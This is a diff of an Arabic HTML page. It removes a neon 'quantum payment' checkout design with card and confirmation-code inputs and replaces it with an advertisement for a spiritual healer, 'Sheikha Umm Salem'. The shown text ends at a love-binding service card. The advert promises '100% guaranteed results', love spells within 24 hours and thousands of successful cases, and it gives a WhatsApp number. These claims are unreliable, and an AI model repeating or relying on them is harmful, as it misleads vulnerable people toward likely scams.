@@ -1,1206 +1,1277 @@
-<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta name="x-poe-datastore-behavior" content="local_only"><meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://code.jquery.com https://unpkg.com https://d3js.org https://threejs.org https://cdn.plot.ly https://stackpath.bootstrapcdn.com https://maps.googleapis.com https://cdn.tailwindcss.com https://ajax.googleapis.com https://kit.fontawesome.com https://cdn.datatables.net https://maxcdn.bootstrapcdn.com https://code.highcharts.com https://tako-static-assets-production.s3.amazonaws.com https://www.youtube.com https://fonts.googleapis.com https://fonts.gstatic.com https://pfst.cf2.poecdn.net https://puc.poecdn.net https://i.imgur.com https://wikimedia.org https://*.icons8.com https://*.giphy.com https://picsum.photos https://images.unsplash.com; frame-src 'self' https://www.youtube.com https://trytako.com; child-src 'self'; manifest-src 'self'; worker-src 'self'; upgrade-insecure-requests; block-all-mixed-content;">
+<!DOCTYPE html><html dir="rtl" lang="ar"><head><meta name="x-poe-datastore-behavior" content="local_only"><meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://code.jquery.com https://unpkg.com https://d3js.org https://threejs.org https://cdn.plot.ly https://stackpath.bootstrapcdn.com https://maps.googleapis.com https://cdn.tailwindcss.com https://ajax.googleapis.com https://kit.fontawesome.com https://cdn.datatables.net https://maxcdn.bootstrapcdn.com https://code.highcharts.com https://tako-static-assets-production.s3.amazonaws.com https://www.youtube.com https://fonts.googleapis.com https://fonts.gstatic.com https://pfst.cf2.poecdn.net https://puc.poecdn.net https://i.imgur.com https://wikimedia.org https://*.icons8.com https://*.giphy.com https://picsum.photos https://images.unsplash.com; frame-src 'self' https://www.youtube.com https://trytako.com; child-src 'self'; manifest-src 'self'; worker-src 'self'; upgrade-insecure-requests; block-all-mixed-content;">
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>الدفع - منصة الدفع الكوانتية</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <script>
-        tailwind.config = {
-            theme: {
-                extend: {
-                    colors: {
-                        'neon-cyan': '#00FFFF',
-                        'neon-pink': '#FF0080',
-                        'neon-green': '#00FF88',
-                        'neon-purple': '#8A2BE2',
-                        'neon-orange': '#FF6600',
-                        'cyber-blue': '#0099FF',
-                        'cyber-violet': '#9966FF',
-                        'electric-lime': '#39FF14'
-                    }
-                }
-            }
-        }
-    </script>
+    <title>الكون الروحاني | الشيخة أم سالم</title>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700&amp;display=swap" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;800;900&family=Rajdhani:wght@300;400;500;600;700&family=Noto+Sans+Arabic:wght@300;400;500;600;700;800;900&display=swap');
-        
+        :root {
+            --main-color: #6a1b9a;
+            --secondary-color: #9c27b0;
+            --accent-color: #ff6b6b;
+            --gold-color: #ffd700;
+            --dark-bg: #0a0812;
+            --card-bg: rgba(255,255,255,0.05);
+            --text-color: #fff;
+            --text-secondary: #b8b8b8;
+            --gradient-1: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            --gradient-2: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            --gradient-3: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+            --shadow-glow: 0 8px 32px rgba(156, 39, 176, 0.3);
+        }
+
         * {
-            font-family: 'Orbitron', 'Noto Sans Arabic', 'Rajdhani', monospace;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Tajawal', sans-serif;
         }
 
         body {
-            background: radial-gradient(ellipse at center, #0a0a0a 0%, #000000 50%, #0a0a0a 100%);
-            background-attachment: fixed;
+            background: var(--dark-bg);
+            color: var(--text-color);
+            line-height: 1.8;
             min-height: 100vh;
-            position: relative;
             overflow-x: hidden;
-        }
-
-        /* خلفية الماتريكس المحسنة */
-        #particles-bg {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -10;
-        }
-
-        /* خلفية ثابتة أكثر */
-        body::before {
-            content: '';
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: 
-                radial-gradient(circle at 20% 80%, rgba(0, 255, 255, 0.08) 0%, transparent 50%),
-                radial-gradient(circle at 80% 20%, rgba(255, 0, 128, 0.08) 0%, transparent 50%),
-                radial-gradient(circle at 40% 40%, rgba(0, 255, 136, 0.06) 0%, transparent 50%);
-            background-size: 800px 800px, 600px 600px, 400px 400px;
-            z-index: -5;
-        }
-
-        /* تأثيرات الهولوجرام المحسنة */
-        .quantum-glass {
-            background: linear-gradient(135deg, 
-                rgba(0, 255, 255, 0.05) 0%,
-                rgba(255, 0, 128, 0.08) 20%,
-                rgba(0, 255, 136, 0.05) 40%,
-                rgba(138, 43, 226, 0.06) 60%,
-                rgba(255, 102, 0, 0.05) 80%,
-                rgba(0, 153, 255, 0.05) 100%);
-            backdrop-filter: blur(25px) saturate(200%) brightness(1.2);
-            border: 2px solid;
-            border-image: linear-gradient(45deg, 
-                #00FFFF, #FF0080, #00FF88, #8A2BE2, #FF6600, #0099FF
-            ) 1;
-            border-radius: 20px;
-            box-shadow: 
-                0 20px 60px rgba(0, 255, 255, 0.2),
-                inset 0 1px 0 rgba(255, 255, 255, 0.2),
-                0 0 80px rgba(255, 0, 128, 0.15);
             position: relative;
+        }
+
+        html, body {
+            width: 100%;
+            max-width: 100%;
+            overflow-x: hidden;
+            scroll-behavior: smooth;
+        }
+
+        /* الخلفية الكونية المحسّنة */
+        .cosmic-bg {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
             overflow: hidden;
+            background: radial-gradient(ellipse at bottom, #1b2735 0%, #090a0f 100%);
         }
 
-        .quantum-glass::before {
-            content: '';
+        /* النجوم المحسّنة */
+        .star {
             position: absolute;
+            background: white;
+            border-radius: 50%;
+            animation: twinkle 3s infinite alternate;
+        }
+
+        .star.big {
+            box-shadow: 0 0 10px rgba(255,255,255,0.8);
+        }
+
+        .star.colored {
+            background: var(--accent-color);
+            box-shadow: 0 0 15px var(--accent-color);
+        }
+
+        /* الشهب المحسّنة */
+        .shooting-star {
+            position: absolute;
+            width: 150px;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, #fff, transparent);
+            animation: shoot 4s linear infinite;
+            z-index: 0;
+        }
+
+        /* القمر المحسّن */
+        .moon {
+            position: fixed;
+            width: 80px;
+            height: 80px;
+            background: radial-gradient(circle at 30% 30%, #fff, #f5f3ce);
+            border-radius: 50%;
+            box-shadow: 0 0 60px rgba(255, 243, 176, 0.6);
+            animation: moonOrbit 40s linear infinite;
+            z-index: 0;
+        }
+
+        /* كوكب الأرض المحسّن */
+        .earth {
+            position: fixed;
+            right: -120px;
+            top: 50%;
+            width: 250px;
+            height: 250px;
+            background: linear-gradient(45deg, #2c5364, #203a43, #0f2027);
+            border-radius: 50%;
+            animation: earthRotate 25s linear infinite;
+            box-shadow: 0 0 80px rgba(44,83,100,0.4);
+            z-index: 0;
+        }
+
+        /* الكويكبات الجديدة */
+        .asteroid {
+            position: fixed;
+            background: #8B4513;
+            border-radius: 50%;
+            animation: asteroidFloat 20s linear infinite;
+            box-shadow: 0 0 20px rgba(139, 69, 19, 0.5);
+        }
+
+        @keyframes moonOrbit {
+            0% { left: -80px; top: 10%; }
+            25% { left: 25%; top: 5%; }
+            50% { left: 75%; top: 15%; }
+            75% { left: 90%; top: 60%; }
+            100% { left: -80px; top: 10%; }
+        }
+
+        @keyframes earthRotate {
+            0% { transform: rotate(0deg) translateY(0px); }
+            50% { transform: rotate(180deg) translateY(-10px); }
+            100% { transform: rotate(360deg) translateY(0px); }
+        }
+
+        @keyframes asteroidFloat {
+            0% { left: -50px; top: 30%; transform: rotate(0deg); }
+            100% { left: 120%; top: 70%; transform: rotate(360deg); }
+        }
+
+        @keyframes shoot {
+            0% {
+                transform: translateX(-200px) translateY(-100px);
+                opacity: 0;
+            }
+            20% {
+                opacity: 1;
+            }
+            80% {
+                opacity: 0.8;
+            }
+            100% {
+                transform: translateX(100vw) translateY(150vh);
+                opacity: 0;
+            }
+        }
+
+        @keyframes twinkle {
+            0% { opacity: 0.3; transform: scale(0.8); }
+            50% { opacity: 1; transform: scale(1.2); }
+            100% { opacity: 0.5; transform: scale(1); }
+        }
+
+        /* التنقل */
+        .navbar {
+            position: fixed;
             top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, 
-                transparent,
-                rgba(0, 255, 255, 0.2),
-                rgba(255, 0, 128, 0.2),
-                transparent);
-            animation: dataFlow 8s ease-in-out infinite;
-        }
-
-        @keyframes dataFlow {
-            0% { left: -100%; }
-            100% { left: 100%; }
-        }
-
-        /* نظام الإدخال الكوانتي */
-        .quantum-input {
-            background: linear-gradient(135deg, 
-                rgba(0, 0, 0, 0.8), 
-                rgba(0, 255, 255, 0.05),
-                rgba(0, 0, 0, 0.8));
-            border: 2px solid;
-            border-image: linear-gradient(45deg, 
-                transparent, #00FFFF, transparent, #FF0080, transparent
-            ) 1;
-            color: #00FFFF;
-            transition: all 0.6s cubic-bezier(0.4, 0, 0.2, 1);
-            position: relative;
+            left: 0;
+            right: 0;
+            background: rgba(10, 8, 18, 0.9);
             backdrop-filter: blur(15px);
-            text-shadow: 0 0 10px currentColor;
+            padding: 15px 0;
+            z-index: 1000;
+            border-bottom: 1px solid var(--main-color);
         }
 
-        .quantum-input:focus {
-            border-image: linear-gradient(45deg, 
-                #00FFFF, #FF0080, #00FF88, #8A2BE2, #FF6600
-            ) 1;
-            background: linear-gradient(135deg, 
-                rgba(0, 255, 255, 0.1), 
-                rgba(0, 0, 0, 0.8),
-                rgba(255, 0, 128, 0.1));
-            box-shadow: 
-                0 0 30px rgba(0, 255, 255, 0.5),
-                inset 0 0 30px rgba(255, 0, 128, 0.2);
-            transform: translateY(-2px);
-            text-shadow: 0 0 15px currentColor;
+        .nav-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 20px;
         }
 
-        /* نظام الأزرار الكوانتية */
-        .quantum-button {
-            background: linear-gradient(135deg, 
-                #00FFFF 0%, 
-                #FF0080 25%, 
-                #00FF88 50%, 
-                #8A2BE2 75%, 
-                #FF6600 100%);
-            background-size: 200% 200%;
-            border: 3px solid transparent;
-            color: #000000;
-            font-weight: 900;
-            text-transform: uppercase;
-            letter-spacing: 3px;
-            position: relative;
-            overflow: hidden;
-            transition: all 0.6s cubic-bezier(0.4, 0, 0.2, 1);
-            text-shadow: 0 0 10px rgba(0, 0, 0, 0.8);
-            box-shadow: 
-                0 10px 40px rgba(0, 255, 255, 0.3),
-                0 0 60px rgba(255, 0, 128, 0.2),
-                inset 0 2px 0 rgba(255, 255, 255, 0.3);
-        }
-
-        .quantum-button::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, 
-                transparent, 
-                rgba(255, 255, 255, 0.6), 
-                transparent);
-            transition: left 0.8s ease;
-            transform: skewX(-25deg);
-        }
-
-        .quantum-button:hover::before {
-            left: 100%;
-        }
-
-        .quantum-button:hover {
-            transform: translateY(-3px) scale(1.02);
-            background-position: 100% 50%;
-            box-shadow: 
-                0 25px 60px rgba(0, 255, 255, 0.6),
-                0 0 100px rgba(255, 0, 128, 0.4),
-                0 0 150px rgba(0, 255, 136, 0.3);
-        }
-
-        /* نصوص الهولوجرام */
-        .hologram-text {
-            background: linear-gradient(135deg, 
-                #00FFFF 0%, 
-                #FF0080 15%, 
-                #00FF88 30%, 
-                #8A2BE2 45%, 
-                #FF6600 60%, 
-                #0099FF 75%, 
-                #9966FF 90%, 
-                #39FF14 100%);
-            background-size: 400% 400%;
+        .logo {
+            font-size: 1.5rem;
+            font-weight: bold;
+            background: var(--gradient-1);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            background-clip: text;
-            animation: neural-network 12s ease-in-out infinite;
-            filter: drop-shadow(0 0 30px rgba(0, 255, 255, 0.6));
         }
 
-        @keyframes neural-network {
-            0%, 100% { 
-                background-position: 0% 50%;
-            }
-            50% { 
-                background-position: 100% 50%;
-            }
+        .nav-links {
+            display: flex;
+            gap: 30px;
+            list-style: none;
         }
 
-        /* مؤشر التحميل الكوانتي */
-        .quantum-loader {
-            width: 120px;
-            height: 120px;
-            border: 6px solid transparent;
-            border-radius: 50%;
-            position: relative;
-            animation: quantumSpin 3s linear infinite;
-            background: conic-gradient(
-                from 0deg,
-                #00FFFF,
-                #FF0080,
-                #00FF88,
-                #8A2BE2,
-                #FF6600,
-                #0099FF,
-                #9966FF,
-                #39FF14,
-                #00FFFF
-            );
-            box-shadow: 
-                0 0 60px rgba(0, 255, 255, 0.5),
-                inset 0 0 30px rgba(255, 255, 255, 0.2);
+        .nav-links a {
+            color: var(--text-color);
+            text-decoration: none;
+            transition: all 0.3s;
+            padding: 10px 15px;
+            border-radius: 25px;
         }
 
-        @keyframes quantumSpin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .nav-links a:hover {
+            background: var(--main-color);
+            transform: translateY(-2px);
         }
 
-        /* الشارات الأمنية المحسنة */
-        .security-badge {
-            background: linear-gradient(135deg, 
-                rgba(0, 255, 255, 0.1), 
-                rgba(255, 0, 128, 0.1));
-            backdrop-filter: blur(20px) saturate(150%);
-            border: 2px solid;
-            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
-            position: relative;
-            overflow: hidden;
-        }
-
-        /* شارة التشفير الكوانتي */
-        .quantum-encryption {
-            border-image: linear-gradient(45deg, #00FFFF, #0099FF) 1;
-            box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
-        }
-
-        .quantum-encryption:hover {
-            transform: translateY(-3px) scale(1.05);
-            box-shadow: 0 15px 50px rgba(0, 255, 255, 0.5);
-        }
-
-        .quantum-encryption .icon-bg {
-            background: linear-gradient(135deg, #00FFFF, #0099FF);
-        }
-
-        /* شارة الذكاء الاصطناعي */
-        .ai-intelligence {
-            border-image: linear-gradient(45deg, #FF0080, #8A2BE2) 1;
-            box-shadow: 0 0 20px rgba(255, 0, 128, 0.3);
-        }
-
-        .ai-intelligence:hover {
-            transform: translateY(-3px) scale(1.05);
-            box-shadow: 0 15px 50px rgba(255, 0, 128, 0.5);
-        }
-
-        .ai-intelligence .icon-bg {
-            background: linear-gradient(135deg, #FF0080, #8A2BE2);
-        }
-
-        /* شارة المعالجة الفورية */
-        .instant-processing {
-            border-image: linear-gradient(45deg, #00FF88, #39FF14) 1;
-            box-shadow: 0 0 20px rgba(0, 255, 136, 0.3);
-        }
-
-        .instant-processing:hover {
-            transform: translateY(-3px) scale(1.05);
-            box-shadow: 0 15px 50px rgba(0, 255, 136, 0.5);
-        }
-
-        .instant-processing .icon-bg {
-            background: linear-gradient(135deg, #00FF88, #39FF14);
-        }
-
-        /* كود التأكيد المحسن */
-        .code-digit {
-            background: linear-gradient(135deg, 
-                rgba(0, 255, 255, 0.1), 
-                rgba(0, 0, 0, 0.8));
-            border: 2px solid #00FFFF;
-            width: 60px;
-            height: 80px;
-            font-size: 2.5rem;
-            font-weight: 900;
+        /* القسم الرئيسي */
+        .hero {
+            padding: 120px 20px 80px;
             text-align: center;
-            border-radius: 12px;
-            color: #00FFFF;
-            text-shadow: 0 0 20px currentColor;
-            transition: all 0.3s ease;
+            position: relative;
+            z-index: 1;
+            background: linear-gradient(135deg, rgba(106,27,154,0.1), rgba(156,39,176,0.1));
+        }
+
+        .main-title {
+            font-size: 4.5rem;
+            background: var(--gradient-1);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 30px var(--main-color);
+            margin: 0 auto 20px;
+            max-width: 900px;
+            animation: titleGlow 3s ease-in-out infinite alternate;
+        }
+
+        .subtitle {
+            font-size: 1.3rem;
+            color: var(--text-secondary);
+            margin-bottom: 40px;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        @keyframes titleGlow {
+            0% { filter: brightness(1); }
+            100% { filter: brightness(1.2) drop-shadow(0 0 20px var(--main-color)); }
+        }
+
+        /* أزرار الإجراءات */
+        .cta-buttons {
+            display: flex;
+            gap: 20px;
+            justify-content: center;
+            flex-wrap: wrap;
+            margin-top: 30px;
+        }
+
+        .cta-btn {
+            padding: 15px 30px;
+            border: none;
+            border-radius: 50px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            transition: all 0.4s;
+            cursor: pointer;
+        }
+
+        .cta-primary {
+            background: var(--gradient-1);
+            color: white;
+        }
+
+        .cta-secondary {
+            background: transparent;
+            color: var(--gold-color);
+            border: 2px solid var(--gold-color);
+        }
+
+        .cta-btn:hover {
+            transform: translateY(-3px) scale(1.05);
+            box-shadow: var(--shadow-glow);
+        }
+
+        /* المحتوى الرئيسي */
+        .content-wrapper {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* بطاقات الخدمات المحسّنة */
+        .services-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 30px;
+            margin: 40px 0;
+        }
+
+        .service-card {
+            background: var(--card-bg);
+            padding: 30px;
+            border-radius: 20px;
+            border: 1px solid var(--secondary-color);
+            backdrop-filter: blur(15px);
+            transition: all 0.4s;
             position: relative;
             overflow: hidden;
         }
 
-        .code-digit:focus {
-            border-color: #00FF88;
-            box-shadow: 0 0 30px rgba(0, 255, 255, 0.5);
+        .service-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: var(--gradient-2);
+            transform: scaleX(0);
+            transition: transform 0.4s;
         }
 
-        .code-digit.filled {
-            border-color: #00FF88;
-            color: #00FF88;
-            background: linear-gradient(135deg, 
-                rgba(0, 255, 136, 0.2), 
-                rgba(0, 0, 0, 0.8));
-            box-shadow: 0 0 30px rgba(0, 255, 136, 0.5);
+        .service-card:hover::before {
+            transform: scaleX(1);
         }
 
-        /* تحسينات للجوال */
+        .service-card:hover {
+            transform: translateY(-8px);
+            box-shadow: var(--shadow-glow);
+            border-color: var(--accent-color);
+        }
+
+        .service-icon {
+            font-size: 3rem;
+            margin-bottom: 20px;
+            display: block;
+            text-align: center;
+        }
+
+        .service-title {
+            color: var(--secondary-color);
+            font-size: 1.8rem;
+            margin-bottom: 15px;
+            text-align: center;
+            font-weight: bold;
+        }
+
+        .service-description {
+            color: var(--text-secondary);
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+
+        .secret-word {
+            display: inline-block;
+            background: var(--gradient-2);
+            padding: 8px 20px;
+            border-radius: 25px;
+            font-weight: bold;
+            margin-top: 15px;
+            animation: pulse 2s infinite;
+            text-align: center;
+            width: 100%;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(156, 39, 176, 0.4); }
+            50% { transform: scale(1.02); box-shadow: 0 0 0 10px rgba(156, 39, 176, 0); }
+            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(156, 39, 176, 0); }
+        }
+
+        /* قسم الشهادات الجديد */
+        .testimonials {
+            margin: 60px 0;
+            padding: 40px;
+            background: rgba(255,255,255,0.03);
+            border-radius: 25px;
+            border: 1px solid var(--main-color);
+        }
+
+        .testimonials h2 {
+            text-align: center;
+            margin-bottom: 40px;
+            font-size: 2.5rem;
+            background: var(--gradient-3);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .testimonial-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 25px;
+        }
+
+        .testimonial-card {
+            background: rgba(255,255,255,0.05);
+            padding: 25px;
+            border-radius: 15px;
+            border-left: 4px solid var(--gold-color);
+            transition: all 0.3s;
+        }
+
+        .testimonial-card:hover {
+            transform: translateX(-5px);
+            box-shadow: 0 10px 25px rgba(255, 215, 0, 0.2);
+        }
+
+        .testimonial-text {
+            font-style: italic;
+            margin-bottom: 15px;
+            color: var(--text-secondary);
+        }
+
+        .testimonial-author {
+            color: var(--gold-color);
+            font-weight: bold;
+        }
+
+        /* قسم الأسئلة الشائعة */
+        .faq-section {
+            margin: 60px 0;
+        }
+
+        .faq-title {
+            text-align: center;
+            font-size: 2.5rem;
+            margin-bottom: 40px;
+            background: var(--gradient-1);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .faq-item {
+            background: var(--card-bg);
+            border-radius: 15px;
+            margin-bottom: 15px;
+            border: 1px solid var(--main-color);
+            overflow: hidden;
+        }
+
+        .faq-question {
+            padding: 20px;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            transition: all 0.3s;
+        }
+
+        .faq-question:hover {
+            background: rgba(156, 39, 176, 0.1);
+        }
+
+        .faq-answer {
+            padding: 0 20px;
+            max-height: 0;
+            overflow: hidden;
+            transition: all 0.4s;
+            color: var(--text-secondary);
+        }
+
+        .faq-answer.active {
+            padding: 20px;
+            max-height: 200px;
+        }
+
+        .faq-toggle {
+            font-size: 1.5rem;
+            color: var(--secondary-color);
+            transition: transform 0.3s;
+        }
+
+        .faq-toggle.active {
+            transform: rotate(45deg);
+        }
+
+        /* شريط التواصل المحسّن */
+        .contact-bar {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: linear-gradient(135deg, rgba(106,27,154,0.95), rgba(156,39,176,0.95));
+            backdrop-filter: blur(15px);
+            padding: 15px;
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            flex-wrap: wrap;
+            z-index: 1000;
+            border-top: 2px solid var(--gold-color);
+        }
+
+        .whatsapp-btn, .phone-btn {
+            background: #25D366;
+            color: white;
+            padding: 12px 25px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.3s;
+            box-shadow: 0 4px 15px rgba(37, 211, 102, 0.3);
+        }
+
+        .phone-btn {
+            background: var(--accent-color);
+            box-shadow: 0 4px 15px rgba(255, 107, 107, 0.3);
+        }
+
+        .whatsapp-btn:hover {
+            background: #128C7E;
+            transform: translateY(-3px) scale(1.05);
+        }
+
+        .phone-btn:hover {
+            background: #ff5252;
+            transform: translateY(-3px) scale(1.05);
+        }
+
+        /* أقسام إضافية */
+        .stats-section {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 30px;
+            margin: 60px 0;
+            text-align: center;
+        }
+
+        .stat-card {
+            background: var(--card-bg);
+            padding: 30px;
+            border-radius: 20px;
+            border: 2px solid var(--gold-color);
+            transition: all 0.3s;
+        }
+
+        .stat-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(255, 215, 0, 0.2);
+        }
+
+        .stat-number {
+            font-size: 3rem;
+            font-weight: bold;
+            color: var(--gold-color);
+            display: block;
+        }
+
+        .stat-label {
+            color: var(--text-secondary);
+            margin-top: 10px;
+        }
+
+        /* الاستجابة للهواتف */
         @media (max-width: 768px) {
-            .quantum-loader {
-                width: 80px;
-                height: 80px;
+            .main-title {
+                font-size: 2.8rem;
             }
             
-            .hologram-text {
-                font-size: 2.5rem;
+            .service-title {
+                font-size: 1.6rem;
             }
             
-            .security-badge {
-                padding: 8px 12px;
-                min-width: auto;
+            .nav-links {
+                display: none;
             }
-
-            .security-badge span {
-                font-size: 12px;
-            }
-
-            .security-badges-grid {
+            
+            .services-grid {
                 grid-template-columns: 1fr;
-                gap: 12px;
-            }
-        }
-
-        @media (max-width: 480px) {
-            .quantum-loader {
-                width: 60px;
-                height: 60px;
             }
             
-            .hologram-text {
-                font-size: 2rem;
+            .cta-buttons {
+                flex-direction: column;
+                align-items: center;
             }
             
-            .security-badge {
-                padding: 6px 10px;
+            .contact-bar {
+                flex-direction: column;
+                gap: 10px;
             }
 
-            .security-badge span {
-                font-size: 10px;
-            }
-
-            .code-digit {
-                width: 50px;
-                height: 65px;
-                font-size: 2rem;
+            .stats-section {
+                grid-template-columns: repeat(2, 1fr);
             }
         }
 
-        /* إزالة الحركات المشتتة */
-        .stable-element {
-            animation: none !important;
+        /* تأثيرات إضافية */
+        .floating {
+            animation: floating 3s ease-in-out infinite;
         }
 
-        /* حركة هادئة للأيقونة الرئيسية فقط */
-        .main-icon {
-            animation: gentleFloat 8s ease-in-out infinite;
+        @keyframes floating {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
         }
 
-        @keyframes gentleFloat {
-            0%, 100% { 
-                transform: translateY(0px);
-            }
-            50% { 
-                transform: translateY(-10px);
-            }
+        .glow-text {
+            text-shadow: 0 0 20px currentColor;
+        }
+
+        .magic-border {
+            position: relative;
+            overflow: hidden;
+        }
+
+        .magic-border::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.5s;
+        }
+
+        .magic-border:hover::before {
+            left: 100%;
         }
     </style>
 <script src="https://puc.poecdn.net/authenticated_preview_page/syncedState.bd4eeeb8e8e02052ee92.js"></script></head>
-<body class="text-white min-h-screen relative">
-    <!-- خلفية الجزيئات المحسنة -->
-    <div id="particles-bg"></div>
+<body>
+    <!-- شريط التنقل -->
+    <nav class="navbar">
+        <div class="nav-content">
+            <div class="logo">🌟 الشيخة أم سالم</div>
+            <ul class="nav-links">
+                <li><a href="#services">الخدمات</a></li>
+                <li><a href="#testimonials">الشهادات</a></li>
+                <li><a href="#faq">الأسئلة</a></li>
+                <li><a href="#contact">التواصل</a></li>
+            </ul>
+        </div>
+    </nav>
 
-    <!-- الصفحة الأولى - بيانات البطاقة -->
-    <div id="page1" class="min-h-screen flex items-center justify-center p-6 relative z-10">
-        <div class="w-full max-w-7xl">
+    <!-- الخلفية الكونية -->
+    <div class="cosmic-bg" id="cosmicBg">
+        <div class="moon floating"></div>
+        <div class="earth"></div>
+    </div>
+
+    <!-- القسم الرئيسي -->
+    <div class="hero">
+        <h1 class="main-title glow-text">الشيخة الروحانية أم سالم</h1>
+        <p class="subtitle">✨ أقوى الأعمال الروحانية المجربة والمضمونة بإذن الله ✨</p>
+        <div class="cta-buttons">
+            <a href="#services" class="cta-btn cta-primary">
+                🔮 استكشف الخدمات
+            </a>
+            <a href="https://wa.me/966543624058" class="cta-btn cta-secondary">
+                💬 استشارة مجانية
+            </a>
+        </div>
+    </div>
+
+    <!-- الإحصائيات -->
+    <div class="content-wrapper">
+        <div class="stats-section">
+            <div class="stat-card magic-border">
+                <span class="stat-number">32+</span>
+                <div class="stat-label">سنة خبرة</div>
+            </div>
+            <div class="stat-card magic-border">
+                <span class="stat-number">5000+</span>
+                <div class="stat-label">حالة ناجحة</div>
+            </div>
+            <div class="stat-card magic-border">
+                <span class="stat-number">24</span>
+                <div class="stat-label">ساعة للاستجابة</div>
+            </div>
+            <div class="stat-card magic-border">
+                <span class="stat-number">100%</span>
+                <div class="stat-label">ضمان النتائج</div>
+            </div>
+        </div>
+
+        <!-- شرح مفصل عن الخدمات -->
+        <div class="service-card" style="text-align: center; margin: 40px 0;">
+            <h2 style="font-size: 2.5rem; color: var(--gold-color); margin-bottom: 20px;">🌙 عن الشيخة أم سالم 🌙</h2>
+            <p style="font-size: 1.2rem; line-height: 1.8; color: var(--text-secondary);">
+                الشيخة الروحانية أم سالم من كبار المختصين في علوم الروحانيات والفلك، ورثت هذه العلوم الشريفة عن آبائها وأجدادها. 
+                تتمتع بخبرة تزيد عن 32 عاماً في مجال الأعمال الروحانية المجربة والمضمونة. 
+                تتميز بالأمانة والصدق والسرية التامة، وتقبل الدفع بعد نجاح العمل ثقة منها في قدرة الله وبركة الأعمال الروحانية.
+            </p>
+        </div>
+        
+        <!-- الخدمات المميزة -->
+        <section id="services">
+            <h2 style="text-align: center; font-size: 3rem; margin: 60px 0 40px; background: var(--gradient-2); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">
+                🔮 خدماتنا الروحانية المتخصصة 🔮
+            </h2>
             
-            <!-- العنوان الرئيسي الكوانتي -->
-            <div class="text-center mb-20">
-                <div class="main-icon mb-12">
-                    <div class="w-32 h-32 mx-auto relative">
-                        <div class="absolute inset-0 bg-gradient-to-br from-neon-cyan via-neon-pink to-neon-green rounded-full border-4 border-neon-cyan shadow-2xl"></div>
-                        <div class="absolute inset-4 bg-gradient-to-br from-neon-purple via-neon-orange to-cyber-blue rounded-full border-3 border-neon-pink shadow-xl"></div>
-                        <div class="absolute inset-8 bg-gradient-to-br from-cyber-violet to-electric-lime rounded-full flex items-center justify-center shadow-lg">
-                            <i class="fas fa-credit-card text-4xl text-black"></i>
-                        </div>
+            <div class="services-grid">
+                <div class="service-card magic-border">
+                    <div class="service-icon">💕</div>
+                    <h3 class="service-title">جلب الحبيب العنيد خلال 24 ساعة</h3>
